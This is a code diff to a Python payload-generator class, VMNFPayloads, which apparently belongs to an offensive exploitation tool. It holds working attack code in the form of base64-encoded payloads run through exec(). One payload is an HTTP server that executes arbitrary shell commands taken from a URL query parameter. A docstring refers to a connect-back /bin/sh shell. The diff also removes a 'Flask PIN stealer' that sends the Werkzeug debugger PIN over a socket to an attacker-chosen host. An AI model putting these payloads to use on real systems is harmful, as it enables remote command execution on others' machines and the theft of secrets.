@@ -45,9 +45,8 @@ class VMNFPayloads:
     def _encode_payload_(self, payload):
         '''simple base64 payload encoding'''
         
-        print("[{}] → Generating {} payload...".format(
-            colored(self.options['module_run'],'blue'),
-            colored(self.options['payload_type'],'blue')
+        print("[{}] → Generating payload...".format(
+            colored(self.options['module_run'],'blue')
             )
         )
         return("exec(" + str(base64.b64encode(payload)) + ".decode('base64'))")
@@ -70,7 +69,8 @@ class VMNFPayloads:
             )
         )
 
-        return(self._encode_payload_("""\nimport os,socket,getpass\ntry:from http.server import SimpleHTTPRequestHandler;import socketserver as SS\nexcept ImportError: from SimpleHTTPServer import SimpleHTTPRequestHandler;import SocketServer as SS\nfrom subprocess import Popen, PIPE\ntry:p2_flag = False;from urllib.parse import urlparse, parse_qs, unquote\nexcept ImportError:p2_flag = True;from urlparse import urlparse,parse_qs,unquote\nclass HRH(SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):pass\n    def do_GET(self):\n        _p_ = "$"\n        _cmd_ ='pwd'\n        self.send_response(200)\n        self.send_header("Content-type", "text/html")\n        self.end_headers()\n        _qc_ = parse_qs(urlparse(self.path).query)\n        if '_cmd_' in _qc_:_cmd_ = _qc_["_cmd_"][0].split()\n        try:process = Popen(_cmd_, stdout=PIPE, stderr=PIPE, universal_newlines=True)\n        except:return\n        stdout, stderr = process.communicate()\n        if os.geteuid() == 0:_p_ = "#"\n        _i_ = "<br>{}{} {}<br>".format(str(getpass.getuser()) + "@" + str(socket.gethostname()), _p_, ' '.join(_cmd_))\n        x ="<html><head><body><font face='monospace'>{}<br><br><br>".format(_i_)\n        for i in stdout.split('\\n'):x += (i + "<br>")\n        x +="</font></body></html>"\n        if p2_flag:self.wfile.write(bytes(x));return\n        self.wfile.write(bytes(x,'utf-8'));return\nSS.TCPServer(("",{_remote_port_}), HRH).serve_forever()\n""".replace("{_remote_port_}",str(remote_port)).replace('_cmd_',xpl_cmd_var).encode('ascii')))
+        return(self._encode_payload_("""\nimport os,socket,getpass,http.server,socketserver\nfrom subprocess import Popen, PIPE\ntry:p2_flag = False;from urllib.parse import urlparse, parse_qs, unquote\nexcept ImportError:p2_flag = True;from urlparse import urlparse,parse_qs,unquote\nclass HRH(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):pass\n    def do_GET(self):\n        _p_ = "$"\n        _cmd_ ='pwd'\n        self.send_response(200)\n        self.send_header("Content-type", "text/html")\n        self.end_headers()\n        _qc_ = parse_qs(urlparse(self.path).query)\n        if '_cmd_' in _qc_:_cmd_ = _qc_["_cmd_"][0].split()\n        try:process = Popen(_cmd_, stdout=PIPE, stderr=PIPE, universal_newlines=True)\n        except:return\n        stdout, stderr = process.communicate()\n        if os.geteuid() == 0:_p_ = "#"\n        _i_ = "<br>{}{} {}<br>".format(str(getpass.getuser()) + "@" + str(socket.gethostname()), _p_, ' '.join(_cmd_))\n        x ="<html><head><body><font face='monospace'>{}<br><br><br>".format(_i_)\n        for i in stdout.split('\\n'):x += (i + "<br>")\n        x +="</font></body></html>"\n        if p2_flag:self.wfile.write(bytes(x));return\n        self.wfile.write(bytes(x,'utf-8'));return\nsocketserver.TCPServer(("",{_remote_port_}), HRH).serve_forever()\n""".replace("{_remote_port_}",str(remote_port)).replace('_cmd_',xpl_cmd_var).encode('ascii')))
+
 
     def olpcb_payload(self):
         """One-liner Python base64 encoded connect back payload (via subprocess.Popen(["/bin/sh","-i"]))"""
@@ -91,16 +91,4 @@ class VMNFPayloads:
                 self.options['local_port']).encode('ascii')
             )
         )
-        
-    def flask_pinstealer(self):
-        """Python Flask PIN stealer payload"""
-        
-        return(self._encode_payload_(
-        """import logging,socket,os\nl = logging.getLogger('werkzeug')\nhandler = logging.FileHandler('/tmp/.t.log')\nl.addHandler(handler)\nP=[line for line in open('/tmp/.t.log').readlines() if "Debugger PIN:" in line]\ns = socket.socket()\ns.connect(('{}',{}))\ns.send(str(P).encode());\ns.close()""".format(
-            self.options['local_host'],
-            self.options['local_port']).encode('ascii')
-            )
-        )
-
-
 
